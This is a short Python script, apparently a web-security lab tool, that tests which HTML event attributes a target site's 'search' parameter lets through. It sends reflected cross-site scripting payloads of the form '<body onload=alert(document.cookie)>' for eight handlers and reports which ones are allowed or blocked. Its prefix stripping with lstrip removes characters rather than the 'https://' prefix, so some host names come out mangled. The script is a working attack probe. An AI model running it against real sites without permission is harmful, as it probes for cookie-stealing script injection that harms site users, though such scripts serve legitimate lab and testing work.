import requests
import sys

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}/'
s = requests.Session()

attributes = ['onload','onunload','onerror','onmessage','onpagehide','onpageshow','onresize','onstorage']

for attr in attributes:
    payload = f'<body {attr}=alert(document.cookie)></body>'
    resp = s.get(f"{url}?search={payload}")
    if resp.status_code == 200:
        print(f"[+] Allowed: {attr}")
    else:
        print(f"[-] Blocked: {attr} with response code {resp.status_code}")
